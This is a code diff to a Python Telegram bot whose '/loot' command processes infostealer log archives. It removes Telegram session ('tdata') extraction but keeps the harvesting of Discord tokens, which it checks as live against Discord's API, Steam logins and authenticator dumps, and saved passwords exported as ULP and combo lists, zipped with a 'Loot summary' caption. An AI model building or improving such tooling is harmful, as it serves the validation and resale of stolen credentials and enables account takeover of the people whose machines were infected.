@@ -3,10 +3,8 @@
 
 Companion to the existing ``/extract`` flow. Where ``/extract`` walks
 an archive for browser cookies that match a target domain, ``/loot``
-walks the same kind of archive for the *rest* of the stuff stealer
-logs contain:
+walks the same kind of archive for the other supported log artifacts:
 
-* Telegram Desktop ``tdata`` session folders (re-zipped per account)
 * Discord auth tokens (live-validated against ``/users/@me``)
 * Steam account logins, sentry files and Mobile Authenticator dumps
 * Saved-password dumps (rendered as ULP + combo lists, with optional
@@ -59,7 +57,6 @@ from services.loot_extractor import (
     LOOT_DISCORD,
     LOOT_PASSWORDS,
     LOOT_STEAM,
-    LOOT_TDATA,
     LootExtractionConfig,
     run_loot_extraction_async,
 )
@@ -111,7 +108,6 @@ def _loot_cancel_kb() -> InlineKeyboardMarkup:
 # Bucket buttons shown in the sub-picker. ``(callback_data, label)``
 _LOOT_TYPE_BUTTONS = [
     (LOOT_ALL, "\U0001f4e6 All Loot"),
-    (LOOT_TDATA, "\U0001f4f1 tdata (Telegram sessions)"),
     (LOOT_DISCORD, "\U0001f3ae Discord tokens"),
     (LOOT_STEAM, "\U0001f3ae Steam accounts"),
     (LOOT_PASSWORDS, "\U0001f511 Passwords (ULP / combos)"),
@@ -147,13 +143,12 @@ def _loot_bucket_lines(progress: ExtractionProgress) -> str:
     if not counts and not active:
         return ""
     emoji = {
-        "tdata": "\U0001f4f1",
         "discord": "\U0001f3ae",
         "steam": "\U0001f3ae",
         "passwords": "\U0001f511",
     }
     out: List[str] = []
-    for name in ("tdata", "discord", "steam", "passwords"):
+    for name in ("discord", "steam", "passwords"):
         if name not in counts and name != active:
             continue
         e = emoji.get(name, "\u2022")
@@ -182,8 +177,7 @@ def _loot_progress_text(progress: ExtractionProgress, elapsed: float) -> str:
 
     Per-bucket counts + an indicator for the currently-running scanner
     are appended underneath the phase summary so the user can see what
-    the bot is actually doing right now (e.g. ``tdata 2`` /
-    ``discord scanning…``).
+    the bot is actually doing right now (e.g. ``discord scanning…``).
     """
     phase = progress.phase
     cur_file = (progress.current_file or "…")
@@ -231,7 +225,7 @@ def _loot_progress_text(progress: ExtractionProgress, elapsed: float) -> str:
         active_line = (
             f"\U0001f50d Scanning bucket: {active}"
             if active else
-            "\U0001f50d Scanning for tdata / Discord / Steam / creds"
+            "\U0001f50d Scanning for Discord / Steam / creds"
         )
         return (
             f"\U0001f4e6 Loot Job\n"
@@ -297,21 +291,18 @@ async def _loot_progress_updater(
 
 def _summary_caption(lr) -> str:
     """One-liner shipped as the caption of ``loot_results.zip``. Lists
-    the four buckets the user is most likely to care about."""
-    valid_tdata = sum(1 for a in lr.tdata if a.valid)
+    the buckets the user is most likely to care about."""
     live_disc = sum(1 for t in lr.discord if t.valid is True)
     live_steam = sum(1 for a in lr.steam if a.valid is True)
     creds = len(lr.credentials)
     lines = ["\U0001f4e6 Loot summary"]
-    if lr.tdata:
-        lines.append(f"   tdata: {len(lr.tdata)} ({valid_tdata} valid)")
     if lr.discord:
         lines.append(f"   discord: {len(lr.discord)} ({live_disc} live)")
     if lr.steam:
         lines.append(f"   steam: {len(lr.steam)} ({live_steam} live)")
     if creds:
         lines.append(f"   credentials: {creds}")
-    if not (lr.tdata or lr.discord or lr.steam or lr.credentials):
+    if not (lr.discord or lr.steam or lr.credentials):
         lines.append("   (no loot found in this archive)")
     return "\n".join(lines)
 
